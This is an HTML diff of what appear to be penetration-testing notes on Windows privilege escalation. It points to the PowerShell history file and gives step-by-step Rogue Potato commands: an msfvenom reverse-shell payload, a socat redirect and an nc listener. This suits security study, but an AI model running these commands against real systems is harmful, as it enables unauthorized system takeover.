@@ -52,35 +52,38 @@
                     </ul>
                     
                     <h2> Valuable files </h2>
-                    <p> Equivalent for .bash_history </p>
-                    <pre><code class="language-powershell">C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></pre>
-
+                    <ul>
+                        <p> Equivalent for .bash_history </p>
+                        <pre><code class="language-powershell">C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></pre>
+                    </ul>    
                 </div>
                 
 
                 <div class="notion-body">
                     <h2 id="Sudo & SUID">Potatoes</h2>
-                    <p> Watch out for more information <a class="notion-link" href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc"> here </a> </p> 
-                    <p> Use Sweet Potato to rule them all - Sweet Potato </p>
-                    <p> If you do not want to use Sweet Potato:</p>
                     <ul>
-                        <li>If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato</li>
-                        <li>If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato</li>
+                        <p> Watch out for more information <a class="notion-link" href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc"> here </a> </p> 
+                        <p> Use Sweet Potato to rule them all - Sweet Potato </p>
+                        <p> If you do not want to use Sweet Potato:</p>
+                        <ul>
+                            <li>If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato</li>
+                            <li>If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato</li>
+                        </ul>
+                        <h3> Rogue Potatoes</h3>
+                        <h4> Musts </h4>
+                        <ul>
+                            <li>You need to have a machine under your control where you can perform the redirect and this machine must be accessible on port 135 by the victim</li>
+                            <li>Upload both exe files from the PoC</li>
+                        </ul>
+                        <p> Creation of a shell that will be used later </p>
+                        <pre><code class="language-powershell">msfvenom -p cmd/Windows/reverse_powershell lhost=LOCAL_IP lport=9999 > shell.bat</code></pre>
+                        <p> Execute that command in attacker machine to capture connection</p>
+                        <pre><code class="language-powershell">socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999</code></pre>
+                        <p> Execute that command in victim machine</p>
+                        <pre><code class="language-powershell">.\RoguePotato.exe -r VICTIM_IP -e ".\shell.bat" -l 9999</code></pre>
+                        <p> Execute that command in attacker machine</p>
+                        <pre><code class="language-powershell">nc -lvnp 9999</code></pre>
                     </ul>
-                    <h3> Rogue Potatoes</h3>
-                    <h4> Musts </h4>
-                    <ul>
-                        <li>You need to have a machine under your control where you can perform the redirect and this machine must be accessible on port 135 by the victim</li>
-                        <li>Upload both exe files from the PoC</li>
-                    </ul>
-                    <p> Creation of a shell that will be used later </p>
-                    <pre><code class="language-powershell">msfvenom -p cmd/Windows/reverse_powershell lhost=LOCAL_IP lport=9999 > shell.bat</code></pre>
-                    <p> Execute that command in attacker machine to capture connection</p>
-                    <pre><code class="language-powershell">socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999</code></pre>
-                    <p> Execute that command in victim machine</p>
-                    <pre><code class="language-powershell">.\RoguePotato.exe -r VICTIM_IP -e ".\shell.bat" -l 9999</code></pre>
-                    <p> Execute that command in attacker machine</p>
-                    <pre><code class="language-powershell">nc -lvnp 9999</code></pre>
                 </div>
         </div>
     </div>
